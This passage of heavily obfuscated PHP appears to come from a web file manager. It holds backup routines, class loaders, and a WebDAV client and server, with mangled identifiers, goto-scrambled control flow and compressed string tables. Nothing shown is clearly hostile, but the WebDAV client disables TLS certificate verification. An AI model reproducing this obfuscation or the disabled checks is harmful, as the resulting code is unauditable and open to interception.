$this->initData($cì…ƒË‡İÍ, $c´¬¯Àã‰‚[$B³ïù¬ß¥à[686]]); } else { $this->checkStore($c´¬¯Àã‰‚[$B³ïù¬ß¥à[686]]); } } self::$option = $c´¬¯Àã‰‚; } private function initData($CóòğƒŒ“ï = 0, $bÄ¶Ó‘³×Ù = '') { goto BÇéŞ«ÖŒ; aç÷»å‚•Ù: $fÆì‘øÒÄÅ[$bÎÃˆì³Ö[363]] = $fÙêç ¸…; return $fÆì‘øÒÄÅ; goto f¤„ĞçÄá; cÄŠÁ°ä¿®: $this->checkStore($Cì·ŒµÄ’[$bÎÃˆì³Ö[686]]); $fÆì‘øÒÄÅ = array($bÎÃˆì³Ö[686] => $Cì·ŒµÄ’[$bÎÃˆì³Ö[686]], $bÎÃˆì³Ö[28] => self::$name, $bÎÃˆì³Ö[684] => 0, $bÎÃˆì³Ö[687] => $Cì·ŒµÄ’[$bÎÃˆì³Ö[687]], $bÎÃˆì³Ö[277] => array($bÎÃˆì³Ö[688] => array($bÎÃˆì³Ö[684] => 0), $bÎÃˆì³Ö[689] => array($bÎÃˆì³Ö[684] => 0, $bÎÃˆì³Ö[690] => 0, $bÎÃˆì³Ö[691] => 0, $bÎÃˆì³Ö[29] => $bÎÃˆì³Ö[33]), $bÎÃˆì³Ö[692] => array($bÎÃˆì³Ö[684] => 0, $bÎÃˆì³Ö[690] => 0, $bÎÃˆì³Ö[691] => 0), $bÎÃˆì³Ö[163] => array($bÎÃˆì³Ö[684] => 0, $bÎÃˆì³Ö[693] => 0, $bÎÃˆì³Ö[694] => 0, $bÎÃˆì³Ö[695] => 0, $bÎÃˆì³Ö[696] => 0, $bÎÃˆì³Ö[414] => $CóòğƒŒ“ï)), $bÎÃˆì³Ö[697] => time(), $bÎÃˆì³Ö[698] => 0); $fÙêç ¸… = Model($bÎÃˆì³Ö[683])->insert($fÆì‘øÒÄÅ); goto aç÷»å‚•Ù; BÇéŞ«ÖŒ: $bÎÃˆì³Ö =& $_SERVER[õëù©û]; $Cì·ŒµÄ’ = Model($bÎÃˆì³Ö[683])->config(); if ($bÄ¶Ó‘³×Ù && $Cì·ŒµÄ’[$bÎÃˆì³Ö[686]] != $bÄ¶Ó‘³×Ù) { $CóòğƒŒ“ï = 0; } goto cÄŠÁ°ä¿®; f¤„ĞçÄá: } private function checkStore($d·çÈ²ó¾) { $Cš°…Ñ©„š =& $_SERVER[õëù©û]; $Dõ¸Ú³±ªÜ = Model($Cš°…Ñ©„š[699])->listData($d·çÈ²ó¾); Model($Cš°…Ñ©„š[699])->checkConfig($Dõ¸Ú³±ªÜ); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[õëù©û][683])->findByName(self::$name); } return self::$option; } public static function set($AƒÂ†Ô“¡„) { $E¼ˆ“šµ˜„ =& $_SERVER[õëù©û]; $Aö¡Ó™à” = self::get(); foreach ($AƒÂ†Ô“¡„ as $Aø¿ô»¦ë => $CÙù±ÜÜ‚æ) { $CŠãàƒÍ‘º = explode($E¼ˆ“šµ˜„[91], $Aø¿ô»¦ë); $B£—Õ˜ä³Ó = count($CŠãàƒÍ‘º); switch ($B£—Õ˜ä³Ó) { case 1: $Aö¡Ó™à”[$CŠãàƒÍ‘º[0]] = $CÙù±ÜÜ‚æ; break; case 2: $Aö¡Ó™à”[$CŠãàƒÍ‘º[0]][$CŠãàƒÍ‘º[1]] = $CÙù±ÜÜ‚æ; break; case 3: $Aö¡Ó™à”[$CŠãàƒÍ‘º[0]][$CŠãàƒÍ‘º[1]][$CŠãàƒÍ‘º[2]] = $CÙù±ÜÜ‚æ; break; } } Model($E¼ˆ“šµ˜„[683])->update($Aö¡Ó™à”[$E¼ˆ“šµ˜„[363]], $Aö¡Ó™à”); self::$option = $Aö¡Ó™à”; return self::$option; } public function keep() { $e½ø…½çƒ =& $_SERVER[õëù©û]; $fÖ¼›ØÇŒÈ = self::get(); if ($fÖ¼›ØÇŒÈ[$e½ø…½çƒ[277]][$e½ø…½çƒ[688]][$e½ø…½çƒ[684]] == $e½ø…½çƒ[83]) { return; } $this->backupKeep($fÖ¼›ØÇŒÈ); self::set(array($e½ø…½çƒ[700] => 1)); } private function backupKeep($añ±É¡Œ) { goto fáÙ¾„±ÍÇ; B‰‘Çºó: for ($bÑè®åöÉï = 0; $bÑè®åöÉï < 12; $bÑè®åöÉï++) { $A˜ö Ò× …[] = date($d×´øƒ÷ˆŠ[701], strtotime("\55{$bÑè®åöÉï}\40\155\157\x6e\x74\150\163")); } $A˜ö Ò× … = array_unique($A˜ö Ò× …); foreach ($D×¼ø‚¯ÚÀ as $B¨µÓ§µ‚ñ) { if (!empty($B¨µÓ§µ‚ñ[$d×´øƒ÷ˆŠ[28]]) && in_array($B¨µÓ§µ‚ñ[$d×´øƒ÷ˆŠ[28]], $A˜ö Ò× …)) { continue; } Model($d×´øƒ÷ˆŠ[683])->remove($B¨µÓ§µ‚ñ[$d×´øƒ÷ˆŠ[363]]); $Eñ¡®Ì†© = "\173\x69\157\x3a{$añ±É¡Œ[$d×´øƒ÷ˆŠ[686]]}\x7d\57\144\141\164\141\x62\141\x73\x65\57\142\x61\143\x6b\x75\160\x5f{$B¨µÓ§µ‚ñ[$d×´øƒ÷ˆŠ[28]]}"; IO::remove($Eñ¡®Ì†©, !1); } goto AŠÍÊµ“”; CÜáÄ°¾…: $bÑè®åöÉï = 0; $A˜ö Ò× … = array(); foreach ($D×¼ø‚¯ÚÀ as $B¨µÓ§µ‚ñ) { if ($bÑè®åöÉï >= 7) { break; } $A˜ö Ò× …[] = $B¨µÓ§µ‚ñ[$d×´øƒ÷ˆŠ[28]]; $bÑè®åöÉï++; } goto B‰‘Çºó; fáÙ¾„±ÍÇ: $d×´øƒ÷ˆŠ =& $_SERVER[õëù©û]; $D×¼ø‚¯ÚÀ = Model($d×´øƒ÷ˆŠ[683])->listData(); if (empty($D×¼ø‚¯ÚÀ)) { return; } goto CÜáÄ°¾…; AŠÍÊµ“”: } public function db() { goto fî •ƒóì; fî •ƒóì: $c¬¢â´×¡š =& $_SERVER[õëù©û]; $eÙÛŠšÖêè = self::get(); if ($eÙÛŠšÖêè[$c¬¢â´×¡š[277]][$c¬¢â´×¡š[689]][$c¬¢â´×¡š[684]] == $c¬¢â´×¡š[83]) { return !0; } goto bïÖ§¯©ó; dàëé¨›ã‡: return !0; goto DÍ†‚ˆß•Ñ; bïÖ§¯©ó: $eÜò–ò’°½ = new BackupDb(); if (!$eÜò–ò’°½->index()) { return !1; } self::set(array($c¬¢â´×¡š[702] => 1)); goto dàëé¨›ã‡; DÍ†‚ˆß•Ñ: } public function dbFile() { goto Fø¼ƒá‰–; Fø¼ƒá‰–: $a™¢•æİÎ‹ =& $_SERVER[õëù©û]; $e¨¡˜ĞÄ = self::get(); if ($e¨¡˜ĞÄ[$a™¢•æİÎ‹[277]][$a™¢•æİÎ‹[692]][$a™¢•æİÎ‹[684]] == $a™¢•æİÎ‹[83]) { return !0; } goto eğ†ˆÀ×Î¡; eğ†ˆÀ×Î¡: $bØÜÔØµâÖ = new BackupDbFile(); if (!$bØÜÔØµâÖ->index()) { return !1; } self::set(array($a™¢•æİÎ‹[703] => 1)); goto DÏ÷«ìÙª; DÏ÷«ìÙª: return !0; goto FìßÓ±òö; FìßÓ±òö: } public function file() { $C’‡Î›ñ¿× =& $_SERVER[õëù©û]; $FÍ“ïÅ‰Ğß = self::get(); if ($FÍ“ïÅ‰Ğß[$C’‡Î›ñ¿×[277]][$C’‡Î›ñ¿×[163]][$C’‡Î›ñ¿×[684]] == $C’‡Î›ñ¿×[83]) { return !0; } if (!isset($FÍ“ïÅ‰Ğß[$C’‡Î›ñ¿×[687]]) || $FÍ“ïÅ‰Ğß[$C’‡Î›ñ¿×[687]] == $C’‡Î›ñ¿×[463]) { $dÓ¿¯½çõ· = new BackupFile(); if (!$dÓ¿¯½çõ·->index()) { return !1; } } self::set(array($C’‡Î›ñ¿×[704] => 1, $C’‡Î›ñ¿×[684] => 1)); return !0; } } class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { goto f˜ƒªƒ“®ğ; D½ÂÊ§ôš: $f ¦½Ğ×Ñ¡ = new DbManage($Cğ»ö‘Ú¯ã, $fÃìêÇÕíÖ); $F¤‚ÃÚÌ®Ç = TEMP_FILES . $FÓæ†ÇÔ¡Ğ[705] . self::$name . $FÓæ†ÇÔ¡Ğ[8]; del_dir($F¤‚ÃÚÌ®Ç); goto eª¶òÁ·´Ù; e†êß¶È®: $B²«˜Ü‘ŸÏ = new Task($FÓæ†ÇÔ¡Ğ[706], $FÓæ†ÇÔ¡Ğ[707], 0, LNG($FÓæ†ÇÔ¡Ğ[708]) . $FÓæ†ÇÔ¡Ğ[709] . LNG($FÓæ†ÇÔ¡Ğ[710])); $eã¹âİ¯÷ˆ = array_diff($eã¹âİ¯÷ˆ, array($FÓæ†ÇÔ¡Ğ[711], $FÓæ†ÇÔ¡Ğ[712])); foreach ($eã¹âİ¯÷ˆ as $FğÖøÃÆ õ) { $e³‹Äóğ„š = $F¤‚ÃÚÌ®Ç . $FğÖøÃÆ õ . $FÓæ†ÇÔ¡Ğ[713]; $bá»£¿ò“ = null; if ($FğÖøÃÆ õ == $FÓæ†ÇÔ¡Ğ[714] && (!isset($bˆæ—¡Ÿ—[$FÓæ†ÇÔ¡Ğ[687]]) || $bˆæ—¡Ÿ—[$FÓæ†ÇÔ¡Ğ[687]] == $FÓæ†ÇÔ¡Ğ[463])) { $bá»£¿ò“ = self::$io; } $DÕ‹›Ò¥Ã += $f ¦½Ğ×Ñ¡->sqlFromDb($FğÖøÃÆ õ, $e³‹Äóğ„š, $B²«˜Ü‘ŸÏ, $bá»£¿ò“); } goto b›â…šœô¦; AÆ‘ƒÄÓ: return !0; goto Còïà™‹Ğ«; f˜ƒªƒ“®ğ: $FÓæ†ÇÔ¡Ğ =& $_SERVER[õëù©û]; $bˆæ—¡Ÿ— = Backup::get(); self::$io = $bˆæ—¡Ÿ—[$FÓæ†ÇÔ¡Ğ[686]]; goto f“§…ÜšŸ; eª¶òÁ·´Ù: mk_dir($F¤‚ÃÚÌ®Ç); $eã¹âİ¯÷ˆ = $f ¦½Ğ×Ñ¡->db()->getTables(); $DÕ‹›Ò¥Ã = 0; goto e†êß¶È®; b›â…šœô¦: $B²«˜Ü‘ŸÏ->end(); $F›âöÄ”ê‘ = array($FÓæ†ÇÔ¡Ğ[715] => $fÃìêÇÕíÖ, $FÓæ†ÇÔ¡Ğ[702] => 1, $FÓæ†ÇÔ¡Ğ[716] => $DÕ‹›Ò¥Ã, $FÓæ†ÇÔ¡Ğ[717] => $DÕ‹›Ò¥Ã); Backup::set($F›âöÄ”ê‘); goto AÆ‘ƒÄÓ; f“§…ÜšŸ: self::$name = $bˆæ—¡Ÿ—[$FÓæ†ÇÔ¡Ğ[28]]; $Cğ»ö‘Ú¯ã = $GLOBALS[$FÓæ†ÇÔ¡Ğ[6]][$FÓæ†ÇÔ¡Ğ[17]]; $fÃìêÇÕíÖ = $this->_dbType($Cğ»ö‘Ú¯ã); goto D½ÂÊ§ôš; Còïà™‹Ğ«: } private function _dbType($CÂïÆ¹âÔ) { goto BÆ½˜Õ÷Ô; AØ§×¿ùÑ‹: if ($A†…Èİ¢ÈŒ == $CÎÚ¢å‰•ğ[719]) { $D„£¹Íñ®å = explode($CÎÚ¢å‰•ğ[4], $CÂïÆ¹âÔ[$CÎÚ¢å‰•ğ[720]]); $A†…Èİ¢ÈŒ = $D„£¹Íñ®å[0]; } $d÷¯Ã’¤Ñ = array($CÎÚ¢å‰•ğ[721] => $CÎÚ¢å‰•ğ[9], $CÎÚ¢å‰•ğ[722] => $CÎÚ¢å‰•ğ[723]); if (isset($d÷¯Ã’¤Ñ[$A†…Èİ¢ÈŒ])) { $A†…Èİ¢ÈŒ = $d÷¯Ã’¤Ñ[$A†…Èİ¢ÈŒ]; } goto EÙ‰…±Š«…; BÆ½˜Õ÷Ô: $CÎÚ¢å‰•ğ =& $_SERVER[õëù©û]; $CÂïÆ¹âÔ = array_change_key_case($CÂïÆ¹âÔ); $A†…Èİ¢ÈŒ = $CÂïÆ¹âÔ[$CÎÚ¢å‰•ğ[718]]; goto AØ§×¿ùÑ‹; EÙ‰…±Š«…: return $A†…Èİ¢ÈŒ; goto CÇãµïà¼; CÇãµïà¼: } } goto E¾ì•³ƒİ¾; fŒ¶î’Óğ„: function Action($D¢–²ìÈøÁ = '') { goto D° óÉìÕ†; cÛ¿õ‡Õ¤É: $bá³…‹êÈ = explode($CÚÅªŞ¿‰[5], $D¢–²ìÈøÁ); $Fœëä×äê¸ = strtolower($bá³…‹êÈ[0]); if (substr($Fœëä×äê¸, -6) == $CÚÅªŞ¿‰[6]) { $D¢–²ìÈøÁ = substr($bá³…‹êÈ[0], 0, -6); $F‘îÇ“®ë = $D¢–²ìÈøÁ . $CÚÅªŞ¿‰[7]; $aëô°ÂÚñ¯ = $CÚÅªŞ¿‰[8]; if (isset($bá³…‹êÈ[1]) && substr(strtolower($bá³…‹êÈ[1]), -5) == $CÚÅªŞ¿‰[9]) { $F‘îÇ“®ë = $D¢–²ìÈøÁ . $bá³…‹êÈ[1]; $aëô°ÂÚñ¯ = $CÚÅªŞ¿‰[10] . $bá³…‹êÈ[1] . $CÚÅªŞ¿‰[11]; } else { if (count($bá³…‹êÈ) == 3) { $F‘îÇ“®ë = $D¢–²ìÈøÁ . $bá³…‹êÈ[1] . $bá³…‹êÈ[2]; $aëô°ÂÚñ¯ = $CÚÅªŞ¿‰[12] . $bá³…‹êÈ[1] . $CÚÅªŞ¿‰[13] . $bá³…‹êÈ[2] . $CÚÅªŞ¿‰[11]; } } $aëô°ÂÚñ¯ = PLUGIN_DIR . $D¢–²ìÈøÁ . $CÚÅªŞ¿‰[4] . $aëô°ÂÚñ¯; } else { if (substr($Fœëä×äê¸, -5) == $CÚÅªŞ¿‰[9]) { $D¢–²ìÈøÁ = substr($bá³…‹êÈ[0], 0, -5); return Model($D¢–²ìÈøÁ); } else { $F‘îÇ“®ë = $bá³…‹êÈ[0] . $bá³…‹êÈ[1]; $aëô°ÂÚñ¯ = CONTROLLER_DIR . $bá³…‹êÈ[0] . $CÚÅªŞ¿‰[4] . $bá³…‹êÈ[1] . $CÚÅªŞ¿‰[14]; } } goto fÄÀ‰Šœ»Š; D° óÉìÕ†: $CÚÅªŞ¿‰ =& $_SERVER[üá]; static $eËÈçí‰ë£ = array(); $D¢–²ìÈøÁ = trim(str_replace($CÚÅªŞ¿‰[4], $CÚÅªŞ¿‰[5], $D¢–²ìÈøÁ), $CÚÅªŞ¿‰[4]); goto cÛ¿õ‡Õ¤É; fÄÀ‰Šœ»Š: $cÀ»ùöàŠù = strtolower($F‘îÇ“®ë); if (isset($eËÈçí‰ë£[$cÀ»ùöàŠù])) { return $eËÈçí‰ë£[$cÀ»ùöàŠù]; } if (is_file($aëô°ÂÚñ¯)) { include_once $aëô°ÂÚñ¯; } goto c†æ¤”ê¯Œ; c†æ¤”ê¯Œ: if (!class_exists($F‘îÇ“®ë)) { return actionCallError("\133{$D¢–²ìÈøÁ}\40\x3d\x3e\40{$F‘îÇ“®ë}\x5d\x20\x63\154\141\163\x73\x20\156\157\164\x20\x65\x78\x69\163\x74\x73\41"); } $eËÈçí‰ë£[$cÀ»ùöàŠù] = new $F‘îÇ“®ë(); return $eËÈçí‰ë£[$cÀ»ùöàŠù]; goto dÅ÷ÀÕˆ˜; dÅ÷ÀÕˆ˜: } function ActionApply($Bï‹ë…ÅÌÄ, $B—×ôÛ‹¬ = array()) { goto A’Ü²Àöµ¥; A’Ü²Àöµ¥: if (is_array($Bï‹ë…ÅÌÄ)) { return call_user_func_array($Bï‹ë…ÅÌÄ, $B—×ôÛ‹¬); } if (function_exists($Bï‹ë…ÅÌÄ)) { return call_user_func_array($Bï‹ë…ÅÌÄ, $B—×ôÛ‹¬); } $dÄÒ÷†Ä¨« = strrpos($Bï‹ë…ÅÌÄ, $_SERVER[üá][5]); goto A¾Ñøó÷šŒ; A¾Ñøó÷šŒ: $Aò‘‘¬‰Ü¦ = substr($Bï‹ë…ÅÌÄ, 0, $dÄÒ÷†Ä¨«); $d¯Õ¬ğĞ¦Ô = substr($Bï‹ë…ÅÌÄ, $dÄÒ÷†Ä¨« + 1); $aÖ¤‘©Ê×Ä = Action($Aò‘‘¬‰Ü¦); goto d³ÛÎ·ëğ; d³ÛÎ·ëğ: if (!method_exists($aÖ¤‘©Ê×Ä, $d¯Õ¬ğĞ¦Ô)) { return actionCallError("{$Bï‹ë…ÅÌÄ}\x20\155\x65\164\150\x6f\x64\40\x6e\x6f\164\40\145\x78\x69\x73\x74\163\x21"); } $EŞ¨±œÃ›Ì = call_user_func_array(array($aÖ¤‘©Ê×Ä, $d¯Õ¬ğĞ¦Ô), $B—×ôÛ‹¬); return $EŞ¨±œÃ›Ì; goto F³éŸ„óİ½; F³éŸ„óİ½: } function actionCallError($cˆê”°ÕÃ›) { $eÉåŞÄªÀ =& $_SERVER[üá]; $a¨ˆ¿›ä·ó = json_encode_force(array($eÉåŞÄªÀ[15] => this_url(), $eÉåŞÄªÀ[16] => $GLOBALS[$eÉåŞÄªÀ[16]])); $a¨ˆ¿›ä·ó = str_replace(array($eÉåŞÄªÀ[17]), array($eÉåŞÄªÀ[4]), $a¨ˆ¿›ä·ó); return write_log($cˆê”°ÕÃ› . $eÉåŞÄªÀ[18] . $a¨ˆ¿›ä·ó, $eÉåŞÄªÀ[19]); } goto C¦²°¨Š¯; e™Ïà¨¿çù: define($_SERVER[õëù©û][0], $_SERVER[õëù©û][1]); $_SERVER[üá] = explode($_SERVER[õëù©û][2], gzinflate(substr($_SERVER[õëù©û][3], 10, -8))); function Model($fÂïŞªÒŞ = '', $e¼‘Í¹ŞÅ = '', $aÔ…ŒÈ„Êâ = '') { goto BÒùåÜå; BÃÈ¿‰Œêê: if (isset($d‰ë¿øî[$d‹œßá»à†])) { return $d‰ë¿øî[$d‹œßá»à†]; } if ($fÂïŞªÒŞ) { $fÂïŞªÒŞ = strtoupper($fÂïŞªÒŞ[0]) . substr($fÂïŞªÒŞ, 1); $E±ÏŒÜùÚ = $fÂïŞªÒŞ . $FĞåÒ‚Ô‡§[1]; if (class_exists($E±ÏŒÜùÚ)) { $d‰ë¿øî[$d‹œßá»à†] = new $E±ÏŒÜùÚ(); return $d‰ë¿øî[$d‹œßá»à†]; } } if (!$aÔ…ŒÈ„Êâ) { $aÔ…ŒÈ„Êâ = $GLOBALS[$FĞåÒ‚Ô‡§[2]][$FĞåÒ‚Ô‡§[3]]; } goto e¶Â†«™™Š; BÒùåÜå: $FĞåÒ‚Ô‡§ =& $_SERVER[üá]; static $d‰ë¿øî = array(); $d‹œßá»à† = strtolower($e¼‘Í¹ŞÅ . $FĞåÒ‚Ô‡§[0] . $fÂïŞªÒŞ); goto BÃÈ¿‰Œêê; e¶Â†«™™Š: $d‰ë¿øî[$d‹œßá»à†] = new ModelBase($fÂïŞªÒŞ, $e¼‘Í¹ŞÅ, $aÔ…ŒÈ„Êâ); return $d‰ë¿øî[$d‹œßá»à†]; goto D¯¢›†³Œ¯; D¯¢›†³Œ¯: } goto fŒ¶î’Óğ„; B¤Ò´×¶ÚŞ: class HttpDavClient { public function __construct($AîÁŠ®š Ú, $bİÎ…ÁÑğ¯, $F¡Ü…–òÔ) { $this->header = array(); $this->userName = $bİÎ…ÁÑğ¯; $this->userPassowrd = $F¡Ü…–òÔ; } protected function makePath($dŠ¥ˆãÍä) { return $dŠ¥ˆãÍä; } protected function setHeader($BìšåòÑ², $f¶ì¹äÎÚ† = false) { if ($f¶ì¹äÎÚ† === !1) { $this->header[] = $BìšåòÑ²; } else { $this->header[] = $BìšåòÑ² . $_SERVER[õëù©û][873] . $f¶ì¹äÎÚ†; } } public function move($D©‹»¸¨òÒ, $Aó‡­öÏß, $A–ÜôÖœˆœ = '') { $E¥ÙŠ‚šÕ‹ =& $_SERVER[õëù©û]; $this->setHeader($E¥ÙŠ‚šÕ‹[1733], $this->makePath($Aó‡­öÏß)); $this->setHeader($E¥ÙŠ‚šÕ‹[1734], $E¥ÙŠ‚šÕ‹[1735]); if ($A–ÜôÖœˆœ) { $this->setHeader($E¥ÙŠ‚šÕ‹[1736], $E¥ÙŠ‚šÕ‹[918] . $A–ÜôÖœˆœ . $E¥ÙŠ‚šÕ‹[921]); } return $this->send($E¥ÙŠ‚šÕ‹[1737], $D©‹»¸¨òÒ); } public function copy($F¿ãÎµÀ¶, $EÅìƒËŒéŒ) { $f‘Ë‡†Æ¥ó =& $_SERVER[õëù©û]; $this->setHeader($f‘Ë‡†Æ¥ó[1733], $this->makePath($EÅìƒËŒéŒ)); $this->setHeader($f‘Ë‡†Æ¥ó[1734], $f‘Ë‡†Æ¥ó[1735]); return $this->send($f‘Ë‡†Æ¥ó[1738], $F¿ãÎµÀ¶); } public function mkcol($eºğƒºÖœé) { $Aˆ‘¡êëÀŸ =& $_SERVER[õëù©û]; $this->setHeader($Aˆ‘¡êëÀŸ[1734], $Aˆ‘¡êëÀŸ[1735]); return $this->send($Aˆ‘¡êëÀŸ[1739], $eºğƒºÖœé); } public function delete($A¶Œ÷®Å×¢, $B‡ïÜ˜øÍ = '') { $Aƒôİ‚õö =& $_SERVER[õëù©û]; if ($B‡ïÜ˜øÍ) { $this->setHeader($Aƒôİ‚õö[1736], $Aƒôİ‚õö[918] . $B‡ïÜ˜øÍ . $Aƒôİ‚õö[921]); } return $this->send($Aƒôİ‚õö[1234], $A¶Œ÷®Å×¢); } public function propfind($dš½²ÂŞ˜‹) { $e¼ë“¨¿Ğ =& $_SERVER[õëù©û]; $this->setHeader($e¼ë“¨¿Ğ[1740], $e¼ë“¨¿Ğ[83]); $this->setHeader($e¼ë“¨¿Ğ[1741], $e¼ë“¨¿Ğ[1742]); $Bİ­ù‘î½¦ = $e¼ë“¨¿Ğ[1743]; return $this->send($e¼ë“¨¿Ğ[1744], $dš½²ÂŞ˜‹, $Bİ­ù‘î½¦); } public function options($dƒ„ŞìõÇÕ) { return $this->send($_SERVER[õëù©û][1745], $dƒ„ŞìõÇÕ); } public function get($Eë´ÔÂä‹¨) { return $this->send($_SERVER[õëù©û][212], $Eë´ÔÂä‹¨); } public function put($cã‹£¶„×, $bÓâÕ¸Óó, $B»Áµ›°’ò = '') { $eÓ¶½†å =& $_SERVER[õëù©û]; if ($B»Áµ›°’ò) { $this->setHeader($eÓ¶½†å[1736], $eÓ¶½†å[918] . $B»Áµ›°’ò . $eÓ¶½†å[921]); } return $this->send($eÓ¶½†å[210], $cã‹£¶„×, $bÓâÕ¸Óó); } protected function send($b„ˆ»³º´, $F£Û…ÄàÏÑ, $dŠ˜¡Î‘›¾ = false, $BôÓ›®¶¹¦ = false) { goto EÙğ„«½ßİ; bßŞ†øĞÏ‹: curl_setopt($Aåè¶Ïæ—ù, CURLOPT_HTTPHEADER, $this->header); curl_setopt($Aåè¶Ïæ—ù, CURLOPT_RETURNTRANSFER, !0); curl_setopt($Aåè¶Ïæ—ù, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS); goto e£–ÍÂ¿õÅ; eí‰Äñé»ˆ: $this->header = array(); return $Dİïù ç¸; goto E¼Æ¤‚öÊ; e£–ÍÂ¿õÅ: curl_setopt($Aåè¶Ïæ—ù, CURLOPT_SSL_VERIFYPEER, !1); curl_setopt($Aåè¶Ïæ—ù, CURLOPT_SSL_VERIFYHOST, !1); $Dİïù ç¸ = curl_exec($Aåè¶Ïæ—ù); goto eí‰Äñé»ˆ; B‡­ø‰·í«: $Aåè¶Ïæ—ù = curl_init($F£Û…ÄàÏÑ); curl_setopt($Aåè¶Ïæ—ù, CURLOPT_CUSTOMREQUEST, $b„ˆ»³º´); curl_setopt($Aåè¶Ïæ—ù, CURLOPT_HTTPAUTH, CURLAUTH_ANY); goto bßŞ†øĞÏ‹; EÙğ„«½ßİ: $Aº¶ÉÌóŒ÷ =& $_SERVER[õëù©û]; $DÖ„àÁÍµ = HttpAuth::make($this->userName, $this->userPassowrd); $this->setHeader($Aº¶ÉÌóŒ÷[1746], $Aº¶ÉÌóŒ÷[50]); goto bÏÁİœñ; bÏÁİœñ: $this->setHeader($DÖ„àÁÍµ); if ($dŠ˜¡Î‘›¾) { $dŠ˜¡Î‘›¾ = $Aº¶ÉÌóŒ÷[1747] . $dŠ˜¡Î‘›¾; } if (!request_url_safe($F£Û…ÄàÏÑ)) { return !1; } goto B‡­ø‰·í«; E¼Æ¤‚öÊ: } } class HttpDavServer { public function __construct($dÇÕ÷£Íğö, $DŒ›¤”œã) { $this->root = $dÇÕ÷£Íğö; $this->initPath($DŒ›¤”œã); $this->start(); } public function initPath($C¯ï„òƒÂ) { $C¹‰‘‚ó› =& $_SERVER[õëù©û]; $A…‡âÈÙ£‘ = rtrim($_SERVER[$C¹‰‘‚ó›[1355]], $C¹‰‘‚ó›[8]) . $C¹‰‘‚ó›[8]; $this->urlBase = substr($A…‡âÈÙ£‘, 0, strpos($A…‡âÈÙ£‘, $C¯ï„òƒÂ) + 1); $this->urlBase = rtrim($this->urlBase, $C¹‰‘‚ó›[8]) . $C¯ï„òƒÂ; $this->path = $this->parsePath($this->pathGet()); } public function checkUser() { $E«¬î“‚Ñ› =& $_SERVER[õëù©û]; $C×»ÁŸ¦¶ = HttpAuth::get(); if ($C×»ÁŸ¦¶[$E«¬î“‚Ñ›[530]] == $E«¬î“‚Ñ›[1748] && $C×»ÁŸ¦¶[$E«¬î“‚Ñ›[890]] == $E«¬î“‚Ñ›[1749]) { return !0; } HttpAuth::error(); } public function start() { goto c¢«˜Ê‘Ûµ; aïí¶”ë‘ï: if (!method_exists($this, $aŒ…ñ¹œèù)) { pr($aŒ…ñ¹œèù . $AäŠ¯œÚ»[1750]); die; } $f¾åµó„İà = array($AäŠ¯œÚ»[1751], $AäŠ¯œÚ»[1752]); if (!in_array($aŒ…ñ¹œèù, $f¾åµó„İà) && !$this->pathExists($this->path)) { $aÂ‘•ªµ›ƒ = array($AäŠ¯œÚ»[1023] => 404); } else { $aÂ‘•ªµ›ƒ = $this->{$aŒ…ñ¹œèù}(); } goto bø‘Œºñ£´; bø‘Œºñ£´: if (!$aÂ‘•ªµ›ƒ) { return; } self::response($aÂ‘•ªµ›ƒ); goto c¿¶µôèé’; c¢«˜Ê‘Ûµ: $AäŠ¯œÚ» =& $_SERVER[õëù©û]; $this->checkUser(); $aŒ…ñ¹œèù = $AäŠ¯œÚ»[142] . HttpHeader::method(); goto aïí¶”ë‘ï; c¿¶µôèé’: } public function pathGet($A¸Ã†«æêÒ = false) { $eöÅ¹’ ÷ä =& $_SERVER[õëù©û]; $bêº®áìå = $A¸Ã†«æêÒ ? $_SERVER[$eöÅ¹’ ÷ä[1753]] : $_SERVER[$eöÅ¹’ ÷ä[1355]]; $bêº®áìå = KodIO::clear(rawurldecode($bêº®áìå)); if (!strstr($bêº®áìå, KodIO::clear($this->urlBase))) { return !1; } return substr($bêº®áìå, strpos($bêº®áìå, $this->urlBase) + strlen($this->urlBase)); } public function pathExists($aõ²µõ«ñ) { return file_exists($aõ²µõ«ñ); } public function pathMkdir($a¢…ŞòÆÁ) { return mkdir($a¢…ŞòÆÁ, 511, !0); } public function pathInfo($c®Õ…–ÇÏ¯) { return path_info($c®Õ…–ÇÏ¯); } public function pathList($EÈ¶éøÙŠ) { return path_list($EÈ¶éøÙŠ); } public function pathOut($aŒñ¡¾·¦²) { echo file_get_contents($aŒñ¡¾·¦²); } public function pathPut($b³áÄ¢‰èì, $dÅ¾íé¸¶ = '') { if (!$dÅ¾íé¸¶) { return file_put_contents($b³áÄ¢‰èì, $_SERVER[õëù©û][33]); } return move_path($dÅ¾íé¸¶, $b³áÄ¢‰èì); } public function pathRemove($DÏøÔãÌ£Ì) { if (is_file($DÏøÔãÌ£Ì)) { return @unlink($this->path); } else { return del_dir($this->path); } } public function pathMove($bµ’÷óÃ©¾, $f‹ˆ¼×ñìî) { return move_path($bµ’÷óÃ©¾, $f‹ˆ¼×ñìî); } public function pathCopy($CŞÒå„š‰ˆ, $CËÕÖÛ‚ƒÊ) { return copy_dir($CŞÒå„š‰ˆ, $CËÕÖÛ‚ƒÊ); } public function parsePath($AŸù‹ùÂñ¿) { return $AŸù‹ùÂñ¿; } public function parseItem($AéŞ´£…š, $F••Ş…—à‚) { goto Aê‰°ĞÃ; DíŒÛº›Ï: $d¤íğšŒë = array($e×ÏƒÒá†»[1754] => KodIO::clear($this->urlBase . $c…Öó×â„…), $e×ÏƒÒá†»[106] => @gmdate($e×ÏƒÒá†»[1755], $AéŞ´£…š[$e×ÏƒÒá†»[106]]), $e×ÏƒÒá†»[183] => @gmdate($e×ÏƒÒá†»[1756], $AéŞ´£…š[$e×ÏƒÒá†»[183]]), $e×ÏƒÒá†»[77] => $AéŞ´£…š[$e×ÏƒÒá†»[77]] ? $AéŞ´£…š[$e×ÏƒÒá†»[77]] : 0); return $d¤íğšŒë; goto fî«ˆøÌç‰; b¨¹¯˜é¸İ: if ($F••Ş…—à‚) { $c…Öó×â„… = $e×ÏƒÒá†»[8] . str_replace($e×ÏƒÒá†»[168], $e×ÏƒÒá†»[8], rawurlencode($this->pathGet())); } if (!trim($AéŞ´£…š[$e×ÏƒÒá†»[106]])) { $AéŞ´£…š[$e×ÏƒÒá†»[106]] = time(); } if (!trim($AéŞ´£…š[$e×ÏƒÒá†»[183]])) { $AéŞ´£…š[$e×ÏƒÒá†»[183]] = time(); } goto DíŒÛº›Ï; Aê‰°ĞÃ: $e×ÏƒÒá†» =& $_SERVER[õëù©û]; $c…Öó×â„… = $this->pathGet() . $e×ÏƒÒá†»[8] . 